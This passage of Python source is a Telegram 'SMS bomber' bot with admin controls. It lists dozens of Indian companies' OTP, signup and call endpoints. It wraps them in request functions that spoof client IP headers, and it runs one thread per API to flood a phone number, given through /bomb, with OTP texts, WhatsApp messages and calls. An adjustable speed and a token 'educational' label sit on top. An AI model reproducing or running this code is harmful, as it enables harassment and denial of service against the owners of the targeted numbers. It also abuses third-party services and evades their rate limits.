        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","hash_key":"XfsoCeXADQA"}}'
    },
    {
        "name": "Country Delight",
        "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","platform":"Android","mode":"new_user"}}'
    },
    {
        "name": "AstroSage",
        "url": lambda phone: f"https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "Rapido",
        "url": "https://customer.rapido.bike/api/otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },
    {
        "name": "TooToo",
        "url": "https://tootoo.in/graphql",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"query":"query sendOtp($mobile_no: String!, $resend: Int!) {{ sendOtp(mobile_no: $mobile_no, resend: $resend) {{ success __typename }} }}","variables":{{"mobile_no":"{phone}","resend":0}}}}'
    },
    {
        "name": "ConfirmTkt",
        "url": lambda phone: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
    {
        "name": "BetterHalf",
        "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","isd_code":"91"}}'
    },
    {
        "name": "Charzer",
        "url": "https://api.charzer.com/auth-service/send-otp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}","appSource":"CHARZER_APP"}}'
    },
    {
        "name": "Nuvama Wealth",
        "url": "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobileNo":"{phone}","emailID":"test@example.com"}}'
    },
    {
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda phone: f'{{"mobile":"{phone}"}}'
    },

    # Gaurav Bomber API (SMS)
    {
        "name": "Gaurav Bomber SMS",
        "url": lambda phone: f"https://bomm.gauravcyber0.workers.dev/?phone={phone}",
        "method": "GET",
        "headers": {},
        "data": None
    },
]

# ================================================================
#                COMBINE ALL APIS INTO TWO LISTS
# ================================================================

def create_new_api_func(api):
    """Convert API dict to a callable function"""
    def func(phone, cc):
        try:
            url = api["url"](phone) if callable(api["url"]) else api["url"]
            headers = api["headers"].copy()
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers["Client-IP"] = headers["X-Forwarded-For"]
            headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"

            if api["method"] == "POST":
                data = api["data"](phone) if api["data"] else None
                if data and isinstance(data, str):
                    if "application/json" in headers.get("Content-Type", ""):
                        data = json.loads(data)
                    response = session.post(url, headers=headers, json=data if isinstance(data, dict) else None, data=data if isinstance(data, str) else None, timeout=5)
                else:
                    response = session.post(url, headers=headers, timeout=5)
            else:  # GET
                response = session.get(url, headers=headers, timeout=5)
            return response.status_code in [200, 201, 202]
        except Exception:
            return False
    return func

# Separate SMS (including WhatsApp) and Call APIs
SMS_API_FUNCTIONS = []
CALL_API_FUNCTIONS = []
ALL_API_NAMES = []

# Original 31 APIs (all SMS)
orig_names = {
    0: "Oyo Rooms",
    1: "Delhivery Direct",
    2: "ConfirmTkt",
    3: "PharmEasy",
    4: "Hero MotoCorp",
    5: "IndiaLends",
    6: "Flipkart (signup status)",
    7: "Flipkart (OTP generate)",
    8: "Lenskart",
    9: "Practo",
    10: "PizzaHut",
    11: "Goibibo",
    12: "Apollo Pharmacy",
    13: "Ajio",
    14: "AltBalaji",
    15: "Aala",
    16: "Grab",
    17: "GheeAPI (gokwik)",
    18: "EdzAPI (gokwik)",
    19: "FalconAPI (breeze.in)",
    20: "NeclesAPI (gokwik)",
    21: "KisanAPI (agrevolution)",
    22: "PWAPI (penpencil)",
    23: "Khatabook",
    24: "JockeyAPI",
    25: "FasiinAPI (gokwik)",
    26: "VidyaKul",
    27: "Aditya Birla Capital",
    28: "Pinknblu",
    29: "Udaan",
    30: "Nuvama Wealth"
}
for idx in range(31):
    def make_orig_func(idx):
        def func(phone, cc):
            return getapi(phone, idx, cc)
        return func
    SMS_API_FUNCTIONS.append(make_orig_func(idx))
    ALL_API_NAMES.append(orig_names.get(idx, f"Original-{idx}"))

# New APIs from ULTIMATE_APIS
for api in ULTIMATE_APIS:
    name_lower = api["name"].lower()
    if "call" in name_lower or "voice" in name_lower:
        CALL_API_FUNCTIONS.append(create_new_api_func(api))
    else:
        SMS_API_FUNCTIONS.append(create_new_api_func(api))
    ALL_API_NAMES.append(api["name"])

logger.info(f"Loaded SMS+WhatsApp APIs: {len(SMS_API_FUNCTIONS)}, Call APIs: {len(CALL_API_FUNCTIONS)}")

# ------------------------------------------------------------------
# Worker functions
# ------------------------------------------------------------------
def sms_worker(user_id, phone_number, api_func, stop_flag):
    cc = DEFAULT_COUNTRY_CODE
    while not stop_flag.is_set():
        interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
        try:
            success = api_func(phone_number, cc)
            with global_request_counter:
                request_counts[user_id] = request_counts.get(user_id, 0) + 1
            if not success:
                logger.debug(f"SMS/WhatsApp API failed for {phone_number}")
        except Exception as e:
            logger.error(f"SMS worker error: {e}")
        for _ in range(int(interval * 2)):
            if stop_flag.is_set():
                break
            time.sleep(0.5)

def call_worker(user_id, phone_number, call_apis, stop_flag):
    cc = DEFAULT_COUNTRY_CODE
    while not stop_flag.is_set():
        for api_func in call_apis:
            if stop_flag.is_set():
                break
            try:
                success = api_func(phone_number, cc)
                with global_request_counter:
                    request_counts[user_id] = request_counts.get(user_id, 0) + 1
                if not success:
                    logger.debug(f"Call API failed for {phone_number}")
            except Exception as e:
                logger.error(f"Call worker error: {e}")
            # Fixed 10 sec wait between call APIs
            for _ in range(int(CALL_INTERVAL_SECONDS * 2)):
                if stop_flag.is_set():
                    break
                time.sleep(0.5)

# ------------------------------------------------------------------
# Bombing task
# ------------------------------------------------------------------
async def perform_bombing_task(user_id, phone_number, context):
    stop_flag = threading.Event()
    bombing_active[user_id] = stop_flag
    request_counts[user_id] = 0
    user_intervals[user_id] = BOMBING_INTERVAL_SECONDS
    user_start_time[user_id] = time.time()

    workers = []

    # Start SMS/WhatsApp workers (one per API)
    for api_func in SMS_API_FUNCTIONS:
        t = threading.Thread(target=sms_worker, args=(user_id, phone_number, api_func, stop_flag))
        t.daemon = True
        workers.append(t)
        t.start()

    # Start Call worker (single thread)
    if CALL_API_FUNCTIONS:
        t = threading.Thread(target=call_worker, args=(user_id, phone_number, CALL_API_FUNCTIONS, stop_flag))
        t.daemon = True
        workers.append(t)
        t.start()

    bombing_threads[str(user_id)] = workers

    start_msg = (
        f"🔥 Bombing started on <code>{phone_number}</code>.\n"
        f"📡 SMS+WhatsApp APIs: {len(SMS_API_FUNCTIONS)} (individual threads, interval adjustable)\n"
        f"📞 Call/Voice APIs: {len(CALL_API_FUNCTIONS)} (sequential, {CALL_INTERVAL_SECONDS}s between calls)\n"
        f"Auto‑stop after 20 minutes.\n"
        f"Use /stop to stop. Use /speedup / /speeddown to change SMS interval.{BRANDING}"
    )
    await context.bot.send_message(
        chat_id=user_id,
        text=start_msg,
        parse_mode=ParseMode.HTML
    )

    last_count = 0
    last_message_time = 0
    try:
        while not stop_flag.is_set():
            await asyncio.sleep(1)
            current_count = request_counts.get(user_id, 0)
            current_time = time.time()
            if current_time - user_start_time.get(user_id, current_time) >= AUTO_STOP_SECONDS:
                logger.info(f"Auto‑stop triggered for user {user_id} after 20 minutes")
                stop_flag.set()
                break
            if current_count > last_count and (current_time - last_message_time) >= TELEGRAM_RATE_LIMIT_SECONDS:
                interval = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
                status_msg = (
                    f"📊 Status: <code>{current_count}</code> requests sent. "
                    f"SMS interval: <code>{interval}</code> sec. Call interval: {CALL_INTERVAL_SECONDS} sec.{BRANDING}"
                )
                await context.bot.send_message(
                    chat_id=user_id,
                    text=status_msg,
                    parse_mode=ParseMode.HTML
                )
                last_count = current_count
                last_message_time = current_time
            if current_count >= MAX_REQUEST_LIMIT:
                stop_flag.set()
                break
    except asyncio.CancelledError:
        pass
    finally:
        stop_flag.set()
        for t in workers:
            t.join(timeout=2)
        if str(user_id) in bombing_threads:
            del bombing_threads[str(user_id)]
        final_count = request_counts.pop(user_id, 0)
        user_intervals.pop(user_id, None)
        user_start_time.pop(user_id, None)
        final_msg = f"✅ Bombing finished. Total requests sent: <code>{final_count}</code>.{BRANDING}"
        await context.bot.send_message(
            chat_id=user_id,
            text=final_msg,
            parse_mode=ParseMode.HTML
        )
        if user_id in bombing_active:
            del bombing_active[user_id]

# ------------------------------------------------------------------
# Speed commands
# ------------------------------------------------------------------
async def speedup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in bombing_active or bombing_active[user_id].is_set():
        await update.message.reply_text(
            "No active bombing session. Start one with /bomb." + BRANDING,
            parse_mode=ParseMode.HTML
        )
        return
    current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
    new_val = max(MIN_INTERVAL, current - 1)
    user_intervals[user_id] = new_val
    await update.message.reply_text(
        f"⚡ Speed increased. New interval: {new_val} seconds.{BRANDING}",
        parse_mode=ParseMode.HTML
    )

async def speeddown(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in bombing_active or bombing_active[user_id].is_set():
        await update.message.reply_text(
            "No active bombing session. Start one with /bomb." + BRANDING,
            parse_mode=ParseMode.HTML
        )
        return
    current = user_intervals.get(user_id, BOMBING_INTERVAL_SECONDS)
    new_val = min(MAX_INTERVAL, current + 1)
    user_intervals[user_id] = new_val
    await update.message.reply_text(
        f"🐢 Speed decreased. New interval: {new_val} seconds.{BRANDING}",
        parse_mode=ParseMode.HTML
    )

# ------------------------------------------------------------------
# Helper: send any message (text or media)
# ------------------------------------------------------------------
async def send_any_message(context, chat_id, update, text=None):
    if update.message.reply_to_message:
        try:
            await context.bot.copy_message(
                chat_id=chat_id,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.reply_to_message.message_id
            )
            return True
        except Exception as e:
            logger.error(f"Failed to copy message: {e}")
            if text:
                await context.bot.send_message(chat_id=chat_id, text=text)
            return False
    else:
        if text:
            await context.bot.send_message(chat_id=chat_id, text=text)
            return True
    return False

# ------------------------------------------------------------------
# Admin decorators
# ------------------------------------------------------------------
def admin_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_admin(user_id):
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

def owner_only(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_owner(user_id):
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# ------------------------------------------------------------------
# Public Commands
# ------------------------------------------------------------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    add_user(user.id, user.username, user.first_name)
    await update.message.reply_text(
        f"Welcome {user.first_name}! 🤖\n"
        f"Commands:\n/bomb &lt;number&gt; - Start bombing (educational)\n/stop - Stop active bombing\n/speedup - Increase bombing speed\n/speeddown - Decrease bombing speed\n/setphone &lt;number&gt; - Set your own phone (to prevent self-bombing)\n/menu - Show menu{BRANDING}",
        parse_mode=ParseMode.HTML
    )

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        logger.info(f"Bomb command received from {user_id} with args: {context.args}")
        if not context.args:
            await update.message.reply_text(
                "Usage: /bomb &lt;phone_number&gt;" + BRANDING,
                parse_mode=ParseMode.HTML
            )
            return
        phone = ''.join(filter(str.isdigit, context.args[0]))
        if len(phone) < 10:
            await update.message.reply_text(
                "Invalid number. At least 10 digits." + BRANDING,
                parse_mode=ParseMode.HTML
            )
            return

        user_phone = get_user_phone(user_id)
        if user_phone and user_phone == phone:
            await update.message.reply_text(
                "❌ Self‑bombing is not allowed." + BRANDING,
                parse_mode=ParseMode.HTML
            )
            return

        if user_id in bombing_active and not bombing_active[user_id].is_set():
            bombing_active[user_id].set()
            await asyncio.sleep(1)

        asyncio.create_task(perform_bombing_task(user_id, phone, context))
    except Exception as e:
        logger.error(f"Error in bomb_command: {e}", exc_info=True)
        await update.message.reply_text(
            "An error occurred. Please try again later." + BRANDING,
            parse_mode=ParseMode.HTML
        )

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_flag = bombing_active.get(user_id)
    if stop_flag and not stop_flag.is_set():
        stop_flag.set()
        await update.message.reply_text(
            "🛑 Stop signal sent. Bombing will stop shortly." + BRANDING,
            parse_mode=ParseMode.HTML
        )
    else:
        await update.message.reply_text(
            "ℹ️ No active bombing found." + BRANDING,
            parse_mode=ParseMode.HTML
        )

async def setphone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args:
        await update.message.reply_text("Usage: /setphone <phone_number>")
        return
    phone = ''.join(filter(str.isdigit, context.args[0]))
    if len(phone) < 10:
        await update.message.reply_text("Invalid number. At least 10 digits.")
        return
    update_user_phone(user_id, phone)
    await update.message.reply_text(f"✅ Your phone number has been saved. You cannot bomb it now.")

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        keyboard = [
            [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("💬 Direct Message", callback_data="admin_dm")],
            [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("🔧 Tools", callback_data="admin_tools")],
        ]
        await update.message.reply_text("🔐 Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text(
            "Menu:\nUse /bomb, /stop, /speedup, /speeddown" + BRANDING,
            parse_mode=ParseMode.HTML
        )

# ------------------------------------------------------------------
# Admin Commands (using decorators)
# ------------------------------------------------------------------
@admin_only
async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /ban <user_id>")
        return
    try:
        target = int(context.args[0])
        if ban_user(target):
            await update.message.reply_text(f"User {target} banned.{BRANDING}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /unban <user_id>")
        return
    try:
        target = int(context.args[0])
        if unban_user(target):
            await update.message.reply_text(f"User {target} unbanned.{BRANDING}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("User not found or not banned.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def delete_user_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /deleteuser <user_id>")
        return
    try:
        target = int(context.args[0])
        if delete_user(target):
            await update.message.reply_text(f"User {target} deleted.{BRANDING}", parse_mode=ParseMode.HTML)
        else:
            await update.message.reply_text("User not found.")
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_user_ids()
    total = len(users)
    success = 0
    failed = 0

    if update.message.reply_to_message:
        for uid in users:
            try:
                await update.message.reply_to_message.copy(chat_id=uid)
                success += 1
            except Exception as e:
                logger.error(f"Failed to send to {uid}: {e}")
                failed += 1
    else:
        text = " ".join(context.args) if context.args else None
        if not text:
            await update.message.reply_text("Usage: /broadcast <message> or reply to a message.")
            return
        for uid in users:
            try:
                await context.bot.send_message(chat_id=uid, text=text)
                success += 1
            except Exception as e:
                logger.error(f"Failed to send to {uid}: {e}")
                failed += 1

    await update.message.reply_text(
        f"📡 Broadcast completed:\n✅ Sent: {success}\n❌ Failed: {failed}\n👥 Total: {total}"
    )

@admin_only
async def dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /dm <user_id> [message] (or reply to a message)")
        return
    try:
        target = int(context.args[0])
    except ValueError:
        await update.message.reply_text("Invalid user ID.")
        return

    if update.message.reply_to_message:
        try:
            await update.message.reply_to_message.copy(chat_id=target)
            await update.message.reply_text(f"✅ Message sent to {target}.")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed: {e}")
    else:
        text = " ".join(context.args[1:]) if len(context.args) > 1 else None
        if not text:
            await update.message.reply_text("Provide a message or reply to a message.")
            return
        try:
            await context.bot.send_message(chat_id=target, text=text)
            await update.message.reply_text(f"✅ Message sent to {target}.")
        except Exception as e:
            await update.message.reply_text(f"❌ Failed: {e}")

@admin_only
async def bulk_dm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) < 1:
        await update.message.reply_text("Usage: /bulkdm <id1,id2,...> [message] (or reply)")
        return
    ids_str = context.args[0]
    ids = [int(x.strip()) for x in ids_str.split(",") if x.strip().isdigit()]
    if not ids:
        await update.message.reply_text("No valid user IDs.")
        return
    text = " ".join(context.args[1:]) if len(context.args) > 1 else None
    success = 0
    for uid in ids:
        if await send_any_message(context, uid, update, text):
            success += 1
    await update.message.reply_text(f"Sent to {success}/{len(ids)} users.{BRANDING}", parse_mode=ParseMode.HTML)

@admin_only
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 0
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    per_page = 10
    users = get_all_users_paginated(page, per_page)
    if not users:
        await update.message.reply_text("No users found.")
        return

    total_users = get_user_count()
    total_pages = (total_users + per_page - 1) // per_page

    text = f"📋 Users (Page {page+1}/{total_pages}):\n\n"
    for u in users:
        text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"

    keyboard = []
    if page > 0:
        keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
    if page + 1 < total_pages:
        keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
    keyboard.append(InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel"))

    reply_markup = InlineKeyboardMarkup([keyboard]) if keyboard else None
    await update.message.reply_text(text, reply_markup=reply_markup)

@admin_only
async def recent_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    page = 0
    if context.args and context.args[0].isdigit():
        page = int(context.args[0])
    per_page = 10
    users = get_recent_users_paginated(page, per_page)
    if not users:
        await update.message.reply_text("No recent users.")
        return

    total_users = get_user_count()
    total_pages = (total_users + per_page - 1) // per_page

    text = f"🕒 Recent Users (Page {page+1}/{total_pages}):\n\n"
    for u in users:
        text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"

    keyboard = []
    if page > 0:
        keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
    if page + 1 < total_pages:
        keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
    keyboard.append(InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_panel"))

    reply_markup = InlineKeyboardMarkup([keyboard]) if keyboard else None
    await update.message.reply_text(text, reply_markup=reply_markup)

@admin_only
async def user_lookup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /lookup <user_id>")
        return
    try:
        uid = int(context.args[0])
        user = get_user_by_id(uid)
        if not user:
            await update.message.reply_text("User not found.")
            return
        target = get_user_target(uid) or "None"
        text = f"User: {uid}\nUsername: @{user['username']}\nName: {user['first_name']}\nRole: {user['role']}\nBanned: {bool(user['banned'])}\nTarget number: {target}{BRANDING}"
        await update.message.reply_text(text, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = get_all_users_paginated(0, 999999)
    data = [dict(u) for u in users]
    backup_json = json.dumps(data, default=str, indent=2)
    file = io.BytesIO(backup_json.encode())
    file.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    await update.message.reply_document(document=file, filename=file.name, caption="Backup of users.")

@owner_only
async def full_backup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await backup(update, context)

@owner_only
async def add_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /addadmin <user_id>")
        return
    try:
        uid = int(context.args[0])
        set_admin_role(uid, True)
        await update.message.reply_text(f"User {uid} is now admin.{BRANDING}", parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text("Invalid user ID.")

@owner_only
async def remove_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /removeadmin <user_id>")
        return
    try:
        uid = int(context.args[0])
        set_admin_role(uid, False)
        await update.message.reply_text(f"User {uid} is no longer admin.{BRANDING}", parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text("Invalid user ID.")

@admin_only
async def api_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"🔢 Total APIs loaded:\n"
        f"📡 SMS+WhatsApp: {len(SMS_API_FUNCTIONS)} (individual threads)\n"
        f"📞 Call/Voice: {len(CALL_API_FUNCTIONS)} (sequential, {CALL_INTERVAL_SECONDS}s gap)\n"
        f"📊 Total: {len(SMS_API_FUNCTIONS) + len(CALL_API_FUNCTIONS)}",
        parse_mode=ParseMode.HTML
    )

@admin_only
async def api_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file_content = "\n".join(ALL_API_NAMES)
    file_bytes = io.BytesIO(file_content.encode('utf-8'))
    file_bytes.name = f"api_list_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    await update.message.reply_document(
        document=file_bytes,
        filename=file_bytes.name,
        caption=f"Total APIs: {len(ALL_API_NAMES)}"
    )

# ------------------------------------------------------------------
# Callback handlers for pagination and admin panel
# ------------------------------------------------------------------
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data == "admin_panel":
        keyboard = [
            [InlineKeyboardButton("👥 User Management", callback_data="admin_users")],
            [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")],
            [InlineKeyboardButton("💬 Direct Message", callback_data="admin_dm")],
            [InlineKeyboardButton("📊 Stats", callback_data="admin_stats")],
            [InlineKeyboardButton("🔧 Tools", callback_data="admin_tools")],
        ]
        await query.edit_message_text("🔐 Admin Panel:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_users":
        keyboard = [
            [InlineKeyboardButton("📋 All Users (Paginated)", callback_data="list_users_page:0")],
            [InlineKeyboardButton("🕒 Recent Users (7 days)", callback_data="recent_users_page:0")],
            [InlineKeyboardButton("🔍 Lookup User", callback_data="lookup_user")],
            [InlineKeyboardButton("🚫 Ban User", callback_data="ban_user")],
            [InlineKeyboardButton("✅ Unban User", callback_data="unban_user")],
            [InlineKeyboardButton("🗑 Delete User", callback_data="delete_user")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
        ]
        await query.edit_message_text("👥 User Management:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_broadcast":
        keyboard = [
            [InlineKeyboardButton("📝 Text Message", callback_data="broadcast_text")],
            [InlineKeyboardButton("🖼 Media (reply to message)", callback_data="broadcast_media")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
        ]
        await query.edit_message_text("📢 Choose broadcast type:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "admin_dm":
        await query.edit_message_text("Send me the user ID of the target.\n\nExample: 123456789")
        context.user_data['dm_mode'] = 'await_id'
    elif data == "admin_stats":
        count = get_user_count()
        await query.edit_message_text(f"📊 Total users: {count}{BRANDING}", parse_mode=ParseMode.HTML)
    elif data == "admin_tools":
        keyboard = [
            [InlineKeyboardButton("💾 Backup Users", callback_data="backup")],
            [InlineKeyboardButton("💾 Full Backup (owner)", callback_data="full_backup")],
            [InlineKeyboardButton("📜 API List", callback_data="api_list")],
            [InlineKeyboardButton("👑 Add Admin", callback_data="add_admin")],
            [InlineKeyboardButton("👑 Remove Admin", callback_data="remove_admin")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")],
        ]
        await query.edit_message_text("🔧 Tools:", reply_markup=InlineKeyboardMarkup(keyboard))
    elif data == "backup":
        # Simpler: ask user to use /backup command
        await query.edit_message_text("Use /backup command.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_tools")]]))
    elif data == "full_backup":
        await query.edit_message_text("Use /fullbackup command.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_tools")]]))
    elif data == "add_admin":
        await query.edit_message_text("Send me the user ID to promote to admin.")
        context.user_data['add_admin'] = 'await'
    elif data == "remove_admin":
        await query.edit_message_text("Send me the user ID to remove from admin.")
        context.user_data['remove_admin'] = 'await'
    elif data == "lookup_user":
        await query.edit_message_text("Send me the user ID to lookup.")
        context.user_data['lookup_user'] = 'await'
    elif data == "ban_user":
        await query.edit_message_text("Send me the user ID to ban.")
        context.user_data['ban_user'] = 'await'
    elif data == "unban_user":
        await query.edit_message_text("Send me the user ID to unban.")
        context.user_data['unban_user'] = 'await'
    elif data == "delete_user":
        await query.edit_message_text("Send me the user ID to delete.")
        context.user_data['delete_user'] = 'await'
    elif data == "broadcast_text":
        await query.edit_message_text("Send me the text message to broadcast to all users.")
        context.user_data['broadcast_mode'] = 'text'
    elif data == "broadcast_media":
        await query.edit_message_text("Reply to this message with the media to broadcast.\n\nType /cancel to abort.")
        context.user_data['broadcast_mode'] = 'media'
    elif data == "api_list":
        # Call the api_list command directly
        await api_list(update, context)
    elif data.startswith("list_users_page:"):
        page = int(data.split(":")[1])
        per_page = 10
        users = get_all_users_paginated(page, per_page)
        if not users:
            await query.edit_message_text("No more users.")
            return
        total_users = get_user_count()
        total_pages = (total_users + per_page - 1) // per_page
        text = f"📋 Users (Page {page+1}/{total_pages}):\n\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, {u['first_name'] or ''}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"list_users_page:{page-1}"))
        if page + 1 < total_pages:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"list_users_page:{page+1}"))
        keyboard.append(InlineKeyboardButton("🔙 Back to User Menu", callback_data="admin_users"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    elif data.startswith("recent_users_page:"):
        page = int(data.split(":")[1])
        per_page = 10
        users = get_recent_users_paginated(page, per_page)
        if not users:
            await query.edit_message_text("No more users.")
            return
        total_users = get_user_count()
        total_pages = (total_users + per_page - 1) // per_page
        text = f"🕒 Recent Users (Page {page+1}/{total_pages}):\n\n"
        for u in users:
            text += f"ID: {u['user_id']}, @{u['username'] or 'no_username'}, joined: {u['joined_at']}\n"
        keyboard = []
        if page > 0:
            keyboard.append(InlineKeyboardButton("◀️ Previous", callback_data=f"recent_users_page:{page-1}"))
        if page + 1 < total_pages:
            keyboard.append(InlineKeyboardButton("Next ▶️", callback_data=f"recent_users_page:{page+1}"))
        keyboard.append(InlineKeyboardButton("🔙 Back to User Menu", callback_data="admin_users"))
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([keyboard]) if keyboard else None)
    else:
        await query.edit_message_text("Unknown action.")

# ------------------------------------------------------------------
# Handler for admin input steps
# ------------------------------------------------------------------
async def handle_admin_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        return

    # Broadcast
    if 'broadcast_mode' in context.user_data:
        mode = context.user_data['broadcast_mode']
        if mode == 'text':
            text = update.message.text
            users = get_all_user_ids()
            success = 0
            failed = 0
            for uid in users:
                try:
                    await context.bot.send_message(chat_id=uid, text=text)
                    success += 1
                except Exception as e:
                    logger.error(f"Broadcast text failed to {uid}: {e}")
                    failed += 1
            await update.message.reply_text(f"Broadcast completed: {success} sent, {failed} failed.")
            context.user_data.pop('broadcast_mode')
        elif mode == 'media':
            if not update.message.reply_to_message:
                await update.message.reply_text("Please reply to the media you want to broadcast.")
                return
            users = get_all_user_ids()
            success = 0
            failed = 0
            for uid in users:
                try:
                    await update.message.reply_to_message.copy(chat_id=uid)
                    success += 1
                except Exception as e:
                    logger.error(f"Broadcast media failed to {uid}: {e}")
                    failed += 1
            await update.message.reply_text(f"Broadcast completed: {success} sent, {failed} failed.")
            context.user_data.pop('broadcast_mode')
        return

    # DM
    if 'dm_mode' in context.user_data:
        if context.user_data['dm_mode'] == 'await_id':
            try:
                target = int(update.message.text)
                context.user_data['dm_target'] = target
                context.user_data['dm_mode'] = 'await_message'
                await update.message.reply_text("Now send the message (text or reply with media).")
            except:
